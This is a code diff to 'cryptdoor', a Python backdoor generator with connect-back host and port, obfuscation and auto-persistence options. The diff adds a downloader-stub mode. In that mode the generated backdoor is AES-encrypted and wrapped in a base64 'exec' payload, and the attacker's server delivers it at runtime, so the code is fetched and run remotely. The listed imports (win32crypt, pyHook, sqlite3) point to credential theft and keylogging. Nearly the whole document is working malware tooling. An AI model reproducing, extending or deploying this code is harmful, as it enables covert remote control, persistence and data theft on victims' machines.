@@ -37,6 +37,7 @@ parser = argparse.ArgumentParser(prog='cryptdoor', usage='./cryptdoor.py [option
 parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
 parser.add_argument("-p", "--port", type=str, help="Port.")
 parser.add_argument('-o', "--obfuscate", action="store_true", help='Enable Obfuscation of backdoor source code.')
+parser.add_argument('-d', "--downloaderstub", action="store_true", help='Enable download of backdoor source at runtime.')
 parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
 parser.add_argument('-x', "--proxy", action="store_true", help='Enable HTTP proxy connect.')
 parser.add_argument('-b', "--backdoorname", type=str, help='Name of backdoor (default backdoor.py).')
@@ -121,7 +122,14 @@ else:
 	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]
 
 cipher = AES.new(key)
-encrypted = EncodeAES(cipher, readyscript)
+if not args.downloaderstub:
+	encrypted = EncodeAES(cipher, readyscript)
+else:
+	with open('stubs/downloader.py') as dl:
+		downloaderscript = dl.read().replace('***HOST***', args.hostname).replace('***PORT***', args.port)
+	encrypted = EncodeAES(cipher, downloaderscript)
+	encrypted2 = EncodeAES(cipher, readyscript)
+	downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted2)))
 
 myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
 mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
@@ -143,7 +151,12 @@ with open(backdoorName, 'w') as f:
 	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))
 
 with open('stubs/server.py', 'rb') as rawserv:
-	finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
+	if not args.downloaderstub:
+		finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber).replace('***CODE***', '')
+	else:
+		with open('stubs/codeserver.py', 'r') as d:
+			codedown = d.read().replace('***HOST***', args.hostname).replace('***PORT***', args.port).replace('***CODE***', base64.b64encode(downpayload).replace('\n', ''))
+		finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber).replace('***CODE***', codedown)
 
 with open(serverName, 'wb') as se:
 	se.write(finalserver)
